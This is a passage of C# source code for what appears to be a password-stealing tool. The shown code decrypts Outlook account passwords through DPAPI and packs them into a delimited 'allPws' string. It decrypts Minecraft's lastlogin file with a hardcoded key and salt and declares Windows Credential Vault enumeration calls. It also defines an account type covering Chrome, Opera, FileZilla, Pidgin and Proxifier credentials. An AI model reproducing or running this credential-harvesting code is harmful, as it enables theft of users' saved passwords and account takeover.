                                    byteMail = enc.GetBytes(mailObj.ToString());
                                }
                                catch
                                {
                                    byteMail = (byte[])mailObj;
                                }


                                object smtpObj = key.GetValue("SMTP Server");
                                if(!smtpObj.Equals(""))
                                {
                                    try
                                    {
                                        byteSmtp = enc.GetBytes(smtpObj.ToString());
                                    }
                                    catch
                                    {
                                        byteSmtp = (byte[])smtpObj;
                                    }
                                } else
                                {
                                    byteSmtp = enc.GetBytes("Nothing");
                                }

                               string url = enc.GetString(byteSmtp).Replace(Strings.Chr(0), Convert.ToChar(string.Empty));
                               string user = enc.GetString(byteMail).ToString().Replace(Convert.ToChar(0), Convert.ToChar(string.Empty));
                               string pass = decPass.Replace(Convert.ToChar(0), Convert.ToChar(string.Empty));
                               

                                // Format like this:
                                // Type ² URL ² User ² Pass ³
                                allPws += "Outlook²" + url + "²" + user + "²" + pass + "³";



                            }
                        }
                    }
                }
            } catch
            { }


        }

        public string decryptOutlookPassword(byte[] encryptedData)
        {

            // DPAPI included in Framework as ProtectedData name. You know this function used in too many applications.
            string decPassword;

            byte[] Data = new byte[encryptedData.Length - 2 + 1];
            Buffer.BlockCopy(encryptedData, 1, Data, 0, encryptedData.Length - 1);

            decPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(Data, null, DataProtectionScope.CurrentUser));
            decPassword = decPassword.Replace(Convert.ToChar(0), Convert.ToChar(string.Empty));

            return decPassword;
        }
        #endregion


    }


}


    public class PKCSKeyGenerator
    {
        /// <summary>
        /// Key used in the encryption algorythm.
        /// </summary>
        private byte[] key = new byte[8];

        /// <summary>
        /// IV used in the encryption algorythm.
        /// </summary>
        private byte[] iv = new byte[8];

        /// <summary>
        /// DES Provider used in the encryption algorythm.
        /// </summary>
        private DESCryptoServiceProvider des = new DESCryptoServiceProvider();

        /// <summary>
        /// Initializes a new instance of the PKCSKeyGenerator class.
        /// </summary>
        public PKCSKeyGenerator()
        {
        }

        /// <summary>
        /// Initializes a new instance of the PKCSKeyGenerator class.
        /// </summary>
        /// <param name="keystring">This is the same as the "password" of the PBEWithMD5AndDES method.</param>
        /// <param name="salt">This is the salt used to provide extra security to the algorythim.</param>
        /// <param name="iterationsMd5">Fill out iterationsMd5 later.</param>
        /// <param name="segments">Fill out segments later.</param>
        public PKCSKeyGenerator(string keystring, byte[] salt, int iterationsMd5, int segments)
        {
            this.Generate(keystring, salt, iterationsMd5, segments);
        }

        /// <summary>
        /// Gets the asymetric Key used in the encryption algorythm.  Note that this is read only and is an empty byte array.
        /// </summary>
        public byte[] Key
        {
            get
            {
                return this.key;
            }
        }

        /// <summary>
        /// Gets the initialization vector used in in the encryption algorythm.  Note that this is read only and is an empty byte array.
        /// </summary>
        public byte[] IV
        {
            get
            {
                return this.iv;
            }
        }

        /// <summary>
        /// Gets an ICryptoTransform interface for encryption
        /// </summary>
        public ICryptoTransform Encryptor
        {
            get
            {
                return this.des.CreateEncryptor(this.key, this.iv);
            }
        }

        /// <summary>
        /// Gets an ICryptoTransform interface for decryption
        /// </summary>
        public ICryptoTransform Decryptor
        {
            get
            {
                return des.CreateDecryptor(key, iv);
            }
        }

        /// <summary>
        /// Returns the ICryptoTransform interface used to perform the encryption.
        /// </summary>
        /// <param name="keystring">This is the same as the "password" of the PBEWithMD5AndDES method.</param>
        /// <param name="salt">This is the salt used to provide extra security to the algorythim.</param>
        /// <param name="iterationsMd5">Fill out iterationsMd5 later.</param>
        /// <param name="segments">Fill out segments later.</param>
        /// <returns>ICryptoTransform interface used to perform the encryption.</returns>
        public ICryptoTransform Generate(string keystring, byte[] salt, int iterationsMd5, int segments)
        {
            // MD5 bytes
            int hashLength = 16;

            // to store contatenated Mi hashed results
            byte[] keyMaterial = new byte[hashLength * segments];

            // --- get secret password bytes ----
            byte[] passwordBytes;
            passwordBytes = Encoding.UTF8.GetBytes(keystring);

            // --- contatenate salt and pswd bytes into fixed data array ---
            byte[] data00 = new byte[passwordBytes.Length + salt.Length];

            // copy the pswd bytes
            Array.Copy(passwordBytes, data00, passwordBytes.Length);

            // concatenate the salt bytes
            Array.Copy(salt, 0, data00, passwordBytes.Length, salt.Length);

            // ---- do multi-hashing and contatenate results  D1, D2 ...  into keymaterial bytes ----
            MD5 md5 = new MD5CryptoServiceProvider();
            byte[] result = null;

            // fixed length initial hashtarget
            byte[] hashtarget = new byte[hashLength + data00.Length];

            for (int j = 0; j < segments; j++)
            {
                // ----  Now hash consecutively for iterationsMd5 times ------
                if (j == 0)
                {
                    // initialize
                    result = data00;
                }
                else
                {
                    Array.Copy(result, hashtarget, result.Length);
                    Array.Copy(data00, 0, hashtarget, result.Length, data00.Length);
                    result = hashtarget;
                }

                for (int i = 0; i < iterationsMd5; i++)
                {
                    result = md5.ComputeHash(result);
                }

                // contatenate to keymaterial
                Array.Copy(result, 0, keyMaterial, j * hashLength, result.Length);
            }

            Array.Copy(keyMaterial, 0, this.key, 0, 8);
            Array.Copy(keyMaterial, 8, this.iv, 0, 8);

            return this.Encryptor;
        }
    }
    public class LastLogin
    {
        private static readonly byte[] LastLoginSalt = new byte[] { 0x0c, 0x9d, 0x4a, 0xe4, 0x1e, 0x83, 0x15, 0xfc };
        private const string LastLoginPassword = "passwordfile";
        public static string GetMinecraftPath()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
        }
        public static string LastLoginFile
        {
            get
            {
                return Path.Combine(GetMinecraftPath(), "lastlogin");
            }
        }

        public static LastLogin GetLastLogin()
        {
            return GetLastLogin(LastLoginFile);
        }

        public static LastLogin GetLastLogin(string lastLoginFile)
        {
            try
            {
                byte[] encryptedLogin = File.ReadAllBytes(lastLoginFile);
                PKCSKeyGenerator crypto = new PKCSKeyGenerator(LastLoginPassword, LastLoginSalt, 5, 1);
                ICryptoTransform cryptoTransform = crypto.Decryptor;
                byte[] decrypted = cryptoTransform.TransformFinalBlock(encryptedLogin, 0, encryptedLogin.Length);
                short userLength = IPAddress.HostToNetworkOrder(BitConverter.ToInt16(decrypted, 0));

                byte[] user = new byte[userLength];
                byte[] password = new byte[decrypted.Length - 4 - userLength];
                for (int i = 0; i < userLength; i++)
                {
                    user[i] = decrypted[i + 2];
                }
                for (int i = 0; i < decrypted.Length - 4 - userLength; i++)
                {
                    password[i] = decrypted[4 + userLength + i];
                }
                LastLogin result = new LastLogin();
                result.Username = System.Text.Encoding.UTF8.GetString(user);
                result.Password = System.Text.Encoding.UTF8.GetString(password);
                return result;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public string Username = string.Empty;
        public string Password = string.Empty;
    }
    public static class VaultCli
    {
        public enum VAULT_ELEMENT_TYPE : Int32
        {
            Undefined = -1,
            Boolean = 0,
            Short = 1,
            UnsignedShort = 2,
            Int = 3,
            UnsignedInt = 4,
            Double = 5,
            Guid = 6,
            String = 7,
            ByteArray = 8,
            TimeStamp = 9,
            ProtectedArray = 10,
            Attribute = 11,
            Sid = 12,
            Last = 13
        }

        public enum VAULT_SCHEMA_ELEMENT_ID : Int32
        {
            Illegal = 0,
            Resource = 1,
            Identity = 2,
            Authenticator = 3,
            Tag = 4,
            PackageSid = 5,
            AppStart = 100,
            AppEnd = 10000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct VAULT_ITEM_WIN8
        {
            public Guid SchemaId;
            public IntPtr pszCredentialFriendlyName;
            public IntPtr pResourceElement;
            public IntPtr pIdentityElement;
            public IntPtr pAuthenticatorElement;
            public IntPtr pPackageSid;
            public UInt64 LastModified;
            public UInt32 dwFlags;
            public UInt32 dwPropertiesCount;
            public IntPtr pPropertyElements;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct VAULT_ITEM_WIN7
        {
            public Guid SchemaId;
            public IntPtr pszCredentialFriendlyName;
            public IntPtr pResourceElement;
            public IntPtr pIdentityElement;
            public IntPtr pAuthenticatorElement;
            public UInt64 LastModified;
            public UInt32 dwFlags;
            public UInt32 dwPropertiesCount;
            public IntPtr pPropertyElements;
        }

        [StructLayout(LayoutKind.Explicit, CharSet = CharSet.Ansi)]
        public struct VAULT_ITEM_ELEMENT
        {
            [FieldOffset(0)] public VAULT_SCHEMA_ELEMENT_ID SchemaElementId;
            [FieldOffset(8)] public VAULT_ELEMENT_TYPE Type;
        }

        [DllImport("vaultcli.dll")]
        public extern static Int32 VaultOpenVault(ref Guid vaultGuid, UInt32 offset, ref IntPtr vaultHandle);

        [DllImport("vaultcli.dll")]
        public extern static Int32 VaultCloseVault(ref IntPtr vaultHandle);

        [DllImport("vaultcli.dll")]
        public extern static Int32 VaultFree(ref IntPtr vaultHandle);

        [DllImport("vaultcli.dll")]
        public extern static Int32 VaultEnumerateVaults(Int32 offset, ref Int32 vaultCount, ref IntPtr vaultGuid);

        [DllImport("vaultcli.dll")]
        public extern static Int32 VaultEnumerateItems(IntPtr vaultHandle, Int32 chunkSize, ref Int32 vaultItemCount, ref IntPtr vaultItem);

        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
        public extern static Int32 VaultGetItem_WIN8(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr pPackageSid, IntPtr zero, Int32 arg6, ref IntPtr passwordVaultPtr);

        [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
        public extern static Int32 VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, Int32 arg5, ref IntPtr passwordVaultPtr);

    }
    internal class Account
    {
        private string _username;

        public string Username
        {
            get
            {
                return _username;
            }
            set
            {
                _username = value;
            }
        }

        private string _password;

        public string Password
        {
            get
            {
                return _password;
            }
            set
            {
                _password = value;
            }
        }

        private string _domain;

        public string Domain
        {
            get
            {
                return _domain;
            }
            set
            {
                _domain = value;
            }
        }

        private AccountType _type;

        public AccountType Type
        {
            get
            {
                return _type;
            }
            set
            {
                _type = value;
            }
        }

        public Account(AccountType Type, string Username, string Password)
        {
            this.Type = Type;
            this.Username = Username;
            this.Password = Password;
        }

        public Account(AccountType Type, string Username, string Password, string Domain)
        {
            this.Type = Type;
            this.Username = Username;
            this.Password = Password;
            this.Domain = Domain;
        }

        public Account(AccountType Type)
        {
            this.Type = Type;
        }

        public override string ToString()
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("PREC.Account {");
            sb.AppendLine("Type:        " + Type.ToString());
            sb.AppendLine("Domain:      " + Domain);
            sb.AppendLine("Username:    " + Username);
            sb.AppendLine("Password:    " + Password);
            sb.AppendLine("}");
            return sb.ToString();
        }
    }

    internal enum AccountType
    {
        Chrome,
        Opera,
        FileZilla,
        Pidgin,
        Proxifier
    }

